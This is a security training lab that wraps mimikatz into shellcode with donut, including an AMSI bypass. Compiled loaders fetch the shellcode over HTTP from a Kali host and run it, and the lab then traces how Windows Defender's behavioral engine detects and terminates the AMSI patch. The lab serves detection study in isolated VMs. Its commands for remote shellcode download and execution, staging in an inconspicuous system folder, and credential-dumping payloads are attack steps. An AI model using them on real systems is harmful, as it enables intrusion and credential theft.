# Lab: Shellcode Generation with Donut and Behavioral Detection Analysis

## Overview

In this lab you will use **donut** to convert `mimikatz.exe` into position-independent shellcode and execute it through the `basic-loader-cs.exe` built in Lab 3. The donut shellcode bootstrap includes an in-process AMSI bypass that patches `AmsiScanBuffer` at runtime - a technique that Windows Defender's behavioral engine detects as `Behavior:Win32/AMSI_Patch_T.B12`. You will observe the live detection, locate the corresponding event log entries, and understand exactly what step in the execution chain triggered it.

This lab demonstrates a critical layering concept: the loader binary is clean (verified in Lab 3), but the payload it executes contains a runtime behavior that Defender's kernel-level monitoring catches regardless of static evasion.

---

## Prerequisites

| Requirement | Details |
|---|---|
| OS (Target) | Windows 11 VM - Local Administrator |
| OS (Attacker) | Kali Linux on the same subnet |
| Permissions | Local Administrator on the Windows target |
| Tools (Kali) | `donut` at `/Lab-Artifacts/donut/donut`, `mimikatz.exe`, Python 3 |
| Tools (Windows) | `basic-loader-cs.exe` from Lab 3 at `C:\Windows\Tasks\`, PowerShell 5.1+ |
| Source (Kali) | `/Lab-Artifacts/Mimikatz/mimikatz.exe` |
| Network | Both VMs on the same host-only or internal network adapter |
| Lab 3 | Complete - `basic-loader-cs.exe` must already be in `C:\Windows\Tasks\` |

> ⚠️ **Warning:** This lab intentionally generates a live behavioral detection. Windows Defender will terminate the shellcode process. Perform this lab inside isolated virtual machines only - never in a production environment or on a domain-joined system.

---

## Lab Goals

- Convert a PE binary to position-independent shellcode using donut
- Understand what donut's shellcode bootstrap does at runtime before handing control to the payload
- Execute the shellcode through the loader built in Lab 3 and observe a live Defender behavioral alert
- Locate `Behavior:Win32/AMSI_Patch_T.B12` in the Windows event log and interpret its fields
- Understand why the AMSI patch triggers a behavioral detection even though the loader binary itself is clean

---

## Background: What Does Donut Do?

**Donut** is a shellcode generator that wraps arbitrary PE files (EXE, DLL, .NET assemblies) inside a position-independent shellcode stub. The stub performs the following at runtime:

1. Decompresses and maps the target PE into the current process's memory
2. Resolves the PE's import table and applies relocations manually (mimicking what the Windows loader does)
3. **Patches AMSI** - writes a `ret` stub over the prologue of `AmsiScanBuffer` in the loaded `amsi.dll`, causing all subsequent AMSI scan calls to return immediately with a clean result
4. For .NET payloads: loads the **Common Language Runtime (CLR)** - the .NET execution engine - and hosts the assembly within it. For native PE payloads like `mimikatz.exe`: calls the PE entry point directly. **No CLR is involved with mimikatz**, which is a native Win32 PE written in C.
5. Passes the supplied command-line arguments to the payload

Step 3 is what this lab focuses on. Donut's shellcode template unconditionally includes the AMSI patch for **all payload types** - native PE and .NET alike. For .NET assemblies this is strictly necessary because the CLR submits any assembly to AMSI before executing it. For native PEs like `mimikatz.exe`, the CLR is never loaded and AMSI is not directly in the execution path, but the bootstrap patches it regardless because it is baked into the standard template.

This means the AMSI patch fires before any payload-specific code runs, purely as a consequence of the donut bootstrap template - not because mimikatz needs it. Defender does not care what comes after the patch; the act of writing to `amsi.dll`'s `.text` section is the detection trigger.

Defender's behavioral engine monitors writes to executable memory regions of loaded system DLLs via a kernel-mode callback. When the donut bootstrap overwrites bytes inside `amsi.dll`, that callback fires synchronously and Defender raises **`Behavior:Win32/AMSI_Patch_T.B12`**.

---

## Part 1: Build the Shellcode on Kali

### Step 1 - Confirm Donut is Present

```bash
which donut
donut --help 2>&1 | head -5
```

**Expected output:**
```
/usr/bin/donut

  [ Donut shellcode generator v1 (built Feb 12 2026 14:39:18)
  [ Copyright (c) 2019-2021 TheWover, Odzhan

 usage: donut [options] <EXE/DLL/VBS/JS>
```

### Step 2 - Confirm the Mimikatz Source Binary Exists

```bash
ls -lh /Lab-Artifacts/Mimikatz/mimikatz.exe
file /Lab-Artifacts/Mimikatz/mimikatz.exe
```

**Expected output:**
```
/Lab-Artifacts/Mimikatz/mimikatz.exe: PE32+ executable for MS Windows 5.02 (console), x86-64, 6 sections
```

### Step 3 - Generate the Shellcode

Run donut from the output directory so the `.bin` file lands in a convenient staging location:
```bash
cd /Lab-Artifacts/Mimikatz/
```

The first payload will be a test payload displaying coffee.
```bash
donut \
    -i /Lab-Artifacts/Mimikatz/mimikatz.exe \
    -a 2 \
    -b 2 \
    -p '"coffee" "exit"' \
    -o mimi-coffee.bin
```

**Flags:**

| Flag | Value | Purpose |
|---|---|---|
| (positional) | `mimikatz.exe` | Source PE to wrap in shellcode |
| `-a` | `2` | Target architecture - `1`=x86, `2`=x64, `3`=x86+x64 |
| `-b` | `2` | AMSI bypass method - `1`=none, `2`=Abort on fail `Bypass AMSI/WLDP/ETW`, `3`=Continue on fail `Bypass AMSI/WLDP/ETW` (default) |
| `-p` | `'"coffee" "exit"'` | Command-line arguments forwarded to mimikatz at runtime (`coffee` = banner, `exit` = terminate) |
| `-o` | `mimi-coffee.bin` | Output shellcode file |

**Expected output:**
```
  [ Instance type : Embedded
  [ Module file   : "/Lab-Artifacts/Mimikatz/mimikatz.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : EXE
  [ Parameters    : "coffee" "exit"
  [ Target CPU    : amd64
  [ AMSI/WDLP/ETW : abort
  [ PE Headers    : overwrite
  [ Shellcode     : "mimi-coffee-alert.bin"
  [ Exit          : Thread
```

The line ` AMSI/WDLP/ETW : abort` confirms the bypass is compiled into the shellcode.

The second payload will be a test payload displaying coffee but mimikatz is missing the `exit` command and thus forgets to exit (this will be important for behavior testing).
```bash
donut \
    -i /Lab-Artifacts/Mimikatz/mimikatz.exe \
    -a 2 \
    -b 2 \
    -p '"coffee"' \
    -o mimi-coffee-alert.bin
```

**Expected output:**
```
  [ Instance type : Embedded
  [ Module file   : "/Lab-Artifacts/Mimikatz/mimikatz.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : EXE
  [ Parameters    : "coffee"
  [ Target CPU    : amd64
  [ AMSI/WDLP/ETW : abort
  [ PE Headers    : overwrite
  [ Shellcode     : "mimi-coffee-alert.bin"
  [ Exit          : Thread
```

### Step 4 - Verify the Output Files

```bash
file mimi-coffee.bin
wc -c mimi-coffee.bin
```

**Expected output:**
```
mimi-coffee.bin: data
<size> mimi-coffee.bin
```

```bash
file mimi-coffee-alert.bin
wc -c mimi-coffee-alert.bin
```

**Expected output:**
```
mimi-coffee-alert.bin: data
<size> mimi-coffee-alert.bin
```

The file is raw binary shellcode with no PE headers - it has no magic bytes that Defender can statically identify as a PE.

---

## Part 2: Build Basic Shellcode Loaders for Behavior Testing

### Step 1 - Compile the C++ Shellcode Loader

```bash
x86_64-w64-mingw32-g++ /Lab-Artifacts/Loader/basic-loader.c -o /Lab-Artifacts/Loader/basic-loader-cpp.exe -lwininet -static -s
```

### Step 2 - Compile the C# Shellcode Loader

```bash
mcs /Lab-Artifacts/Loader/basic-loader.cs -out:/Lab-Artifacts/Loader/basic-loader-cs.exe -target:exe -platform:x64
```

### Step 3 - Verify the Output Files

```bash
cd /Lab-Artifacts/Loader/
file basic-loader*.exe
```

**Expected output:**
```
basic-loader-cpp.exe: PE32+ executable for MS Windows 5.02 (console), x86-64 (stripped to external PDB), 9 sections
basic-loader-cs.exe:  PE32+ executable for MS Windows 4.00 (console), x86-64 Mono/.Net assembly, 3 sections
```

---
## Part 3: Stage the Basic Shellcode Loaders

### Step 1 - Start the HTTP Server

Serve from the donut output directory:

```bash
cd /Lab-Artifacts/Loader/

python3 -m http.server 8080
```

**Expected output:**
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Leave this terminal open to monitor download requests from the Windows VM.

### Step 2 - Note Your Kali IP Address

Open a second Kali terminal:

```bash
ip -4 addr show eth0 | grep inet
```

---

## Part 4: Transfer the Binaries to the Windows VM

### Step 1 - Open an Elevated PowerShell Session on Windows

1. Right-click the Start menu on the Windows VM.
2. Select **Windows PowerShell (Admin)** or **Terminal (Admin)**.

### Step 2 - Download the Binaries to C:\Windows\Tasks\

`C:\Windows\Tasks\` is a writable system directory that blends into normal Windows activity. Replace `<KALI-IP>` with the IP recorded in Part 3 Step 2:

```powershell
Invoke-WebRequest -Uri 'http://<KALI-IP>:8080/basic-loader-cpp.exe' `
                  -OutFile 'C:\Windows\Tasks\basic-loader-cpp.exe'
```

**Expected behaviour:**
- The file downloads silently.
- On your Kali terminal you will see:
  ```
  192.168.x.x - - [date] "GET /basic-loader-cpp.exe HTTP/1.1" 200 -
  ```
- Windows Defender should **not** raise an alert. If it does, note the threat name and refer to the Common Errors section.

```powershell
Invoke-WebRequest -Uri 'http://<KALI-IP>:8080/basic-loader-cs.exe' `
                  -OutFile 'C:\Windows\Tasks\basic-loader-cs.exe'
```

**Expected behaviour:**
- The file downloads silently.
- On your Kali terminal you will see:
  ```
  192.168.x.x - - [date] "GET /basic-loader-cs.exe HTTP/1.1" 200 -
  ```
- Windows Defender should **not** raise an alert. If it does, note the threat name and refer to the Common Errors section.

### Step 3 - Confirm the Files Arrived

```powershell
Get-Item 'C:\Windows\Tasks\basic-loader-cpp.exe' | Select-Object Name, Length, LastWriteTime
```

**Expected output:**
```
Name                        Length LastWriteTime
----                        ------ -------------
basic-loader-cpp.exe      <size> <timestamp>
```

```powershell
Get-Item 'C:\Windows\Tasks\basic-loader-cs.exe' | Select-Object Name, Length, LastWriteTime
```

**Expected output:**
```
Name                        Length LastWriteTime
----                        ------ -------------
basic-loader-cs.exe      <size> <timestamp>
```

---

## Part 5: Stage the Shellcode on Kali

### Step 1 - Start the HTTP Server

Stop the the current python web server by using the `ctrl+c` keyboard combination.
```bash
^C
Keyboard interrupt received, exiting.
```

Serve from the donut output directory:

```bash
cd /Lab-Artifacts/Mimikatz/

python3 -m http.server 8080
```

**Expected output:**
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Leave this terminal open to monitor download requests from the Windows VM.

### Step 2 - Note Your Kali IP Address

Open a second Kali terminal:

```bash
ip -4 addr show eth0 | grep inet
```

> 📝 **Note:** Replace `eth0` with your actual interface name if different (e.g. `eth1`, `ens33`). Record the IP.

---

## Part 6: Execute the Shellcode via the Loaders

### Step 1 - Confirm the Loader is Present on Windows

In an elevated PowerShell session on the Windows VM:

```powershell
Get-Item 'C:\Windows\Tasks\loader.exe' | Select-Object Name, Length
```

If the loader is not present, repeat the transfer steps from Lab 3 before continuing.

### Step 2 - Execute the Loader with the Shellcode URL

Replace `<KALI-IP>` with the IP:

```powershell
C:\Windows\Tasks\loader.exe http://<KALI-IP>:8080/mimi-coffee-alert.bin
```

```powershell
C:\Windows\Tasks\basic-loader-cpp.exe http://<KALI-IP>:8080/mimi-coffee-alert.bin
```

```powershell
C:\Windows\Tasks\basic-loader-cs.exe http://<KALI-IP>:8080/mimi-coffee-alert.bin
```

**What the loader does:**
1. Calls `InternetOpenA` / `HttpOpenRequestA` to fetch `mimi-coffee-alert.bin` over HTTP
2. Reads the shellcode into a heap buffer
3. Allocates a new RW memory region with `VirtualAlloc`
4. Copies the shellcode
5. Calls `VirtualProtect` to flip the region to RX
6. Calls `CreateThread` to execute the shellcode

**What the donut bootstrap does once the thread starts:**
1. Locates `amsi.dll` in the process's loaded module list via PEB walk
2. Resolves the `AmsiScanBuffer` export
3. **Writes a `ret` stub over the function prologue** - this is the AMSI patch; Defender kills the process here
4. (If not killed) Calls the `mimikatz.exe` PE entry point directly - no CLR is loaded; mimikatz is a native Win32 PE

**Expected behaviour:**
- The PowerShell window pauses briefly as the shellcode downloads and begins executing
- A Defender toast notification appears: **"Threat found"** or **"Virus & threat protection"**
- The process is **terminated by Defender** before mimikatz outputs anything
- On your Kali terminal, a `200` log entry confirms the download was delivered:
  ```
  192.168.x.x - - [date] "GET /mimi-coffee-alert.bin HTTP/1.1" 200 -
  ```

> 📝 **Note:** The `coffee` command output from mimikatz will **not** appear. Defender terminates the process when it detects the AMSI patch at bootstrap step 3 - before the mimikatz PE entry point is ever called. The absence of output is the expected result.

---

## Part 7: Observe the Defender Alert

### Step 1 - Check the Threat Detection Record

```powershell
Get-MpThreatDetection | Select-Object -Last 3 | Format-List
```

**Key fields to note:**

| Field                   | Expected Value                    | Meaning                                                             |
| ----------------------- | --------------------------------- | ------------------------------------------------------------------- |
| `ThreatName`            | `Behavior:Win32/AMSI_Patch_T.B12` | The specific behavioral signature that fired                        |
| `ProcessName`           | `basic-loader-cs.exe`             | The process that triggered the detection                            |
| `DetectionSourceTypeID` | `4`                               | `4` = behavior monitoring (as opposed to `3` = real-time file scan) |
| `ActionSuccess`         | `True`                            | Defender successfully terminated the process                        |
| `RemediationTime`       | (timestamp)                       | When the process was killed                                         |

> 📝 **Note:** `DetectionSourceTypeID: 4` is significant - this is a **behavioral** detection, not a static scan. Defender did not flag `mimi-coffee-alert.bin` on disk or when downloaded. The detection fired only when the shellcode patched a live system DLL in memory.

### Step 2 - View the Alert in Windows Security GUI

1. Open **Windows Security** from the Start menu.
2. Navigate to **Virus & threat protection → Protection history**.
3. Find the most recent entry - it will show the threat name `Behavior:Win32/AMSI_Patch_T.B12` and the affected process.

### Step 3 - Check the Defender Operational Event Log

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
  Where-Object { $_.Id -in @(1116, 1117) } |
  Select-Object TimeCreated, Id, Message |
  Select-Object -First 3 |
  Format-List
```

**In Event ID 1116, locate these fields:**

| Field | Value | Meaning |
|---|---|---|
| `Threat Name` | `Behavior:Win32/AMSI_Patch_T.B12` | Behavioral signature name |
| `Detection Type` | `FastPath` or `Behavior` | Indicates runtime behavior monitoring, not static signature |
| `Path` | Path to `basic-loader-cs.exe` | The process image Defender attributed the behavior to |
| `Process Name` | `basic-loader-cs.exe` | Confirms the detection was attributed to the loader, not a system process |

> 📝 **Note:** The `Path` field points to the loader binary, not to `mimi-coffee-alert.bin`. Defender attributes behavioral detections to the executing process, not to the shellcode bytes themselves. The `.bin` file on Kali was never seen by Defender - only the executing thread's memory activity was monitored.

---

## Part 8: Understand the Detection Chain

Reconstruct the full execution chain by correlating the event log with what you know about the loader and donut bootstrap:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
  Where-Object { $_.Id -in @(1116, 1117, 1006) } |
  Select-Object TimeCreated, Id, Message |
  Select-Object -First 5 |
  Format-List
```

Also check for process creation events if Process Auditing is enabled:

```powershell
Get-WinEvent -LogName Security |
  Where-Object { $_.Id -eq 4688 } |
  Select-Object -Last 5 |
  Format-List
```

**The detection chain, step by step:**

| Step | Actor | Action | Detected? |
|---|---|---|---|
| 1 | `basic-loader-cs.exe` | Downloads `mimi-coffee-alert.bin` via WinInet | No - raw `.bin` has no static signature |
| 2 | `basic-loader-cs.exe` | Allocates RW memory, copies shellcode, flips to RX | No - normal API usage pattern |
| 3 | `basic-loader-cs.exe` | `CreateThread` executes donut bootstrap | No - no signature at this point |
| 4 | Donut bootstrap | Locates `amsi.dll` via PEB walk | No - passive read |
| 5 | Donut bootstrap | **Writes `ret` stub over `AmsiScanBuffer`** | **YES - `Behavior:Win32/AMSI_Patch_T.B12`** |
| 6 | Defender | Terminates the thread | - |
| 7 | mimikatz | Never reached | - |

**Why step 5 is caught:** Defender installs a kernel-mode callback that monitors writes to executable memory regions of loaded system DLLs. When any thread in any process writes to the `.text` section of `amsi.dll`, the callback fires synchronously. There is no bypass of the loader's IAT, no static string, and no file-based signature involved - this is pure runtime memory protection.

**Why the loader itself passed Lab 3:** The loader contains no AMSI patching code. It allocates memory, copies bytes, and creates a thread - all operations with legitimate uses that do not trigger this specific behavioral rule. The detection boundary is precisely at the point where the payload (not the loader) modifies a protected DLL.

---

## What a Successful Lab Looks Like

| Check | Expected Result |
|---|---|
| Donut generates `mimi-coffee-alert.bin` | Output confirms `AMSI/WDLP/ETW : abort` |
| Loader downloads shellcode | Kali HTTP log shows `200 GET /mimi-coffee-alert.bin` |
| Shellcode begins executing | No immediate output - process killed by Defender |
| Defender toast appears | "Threat found" notification with behavioral detection name |
| `ThreatName` in `Get-MpThreatDetection` | `Behavior:Win32/AMSI_Patch_T.B12` |
| `DetectionSourceTypeID` | `4` (behavior monitoring, not file scan) |
| `ProcessName` | `basic-loader-cs.exe` |
| Mimikatz `coffee` output | **Not seen** - process killed before mimikatz entry point is reached |

---

---

## Common Errors and Fixes

| Error | Cause | Fix |
|---|---|---|
| `donut: command not found` or `Permission denied` | Binary not executable | `chmod +x /Lab-Artifacts/donut/donut` |
| `donut` exits with no output file | Missing mimikatz.exe at the specified path | Confirm path with `ls /Lab-Artifacts/Mimikatz/mimikatz.exe` |
| Loader exits immediately with no detection | AMSI bypass already neutralized by a prior session change | Open a fresh PowerShell window and re-run |
| `mimi-coffee-alert.bin` is quarantined on download | Defender's network inspection flagged the shellcode statically | Check if Defender raised Event ID 1116 on the download; this would indicate a static signature - note the threat name and proceed |
| No event in `Get-MpThreatDetection` after execution | Real-time protection was disabled | Run `Get-MpPreference | Select DisableRealtimeMonitoring` - must be `False` |
| `Get-WinEvent` returns no events | Log was cleared or filtering is too narrow | Remove the `Where-Object` filter and check the last 10 raw events from the Defender log |
| HTTP server returns `404` for `mimi-coffee-alert.bin` | Server started from wrong directory | Confirm `python3 -m http.server 8080` was run from `/Lab-Artifacts/Mimikatz/` where the `.bin` resides |
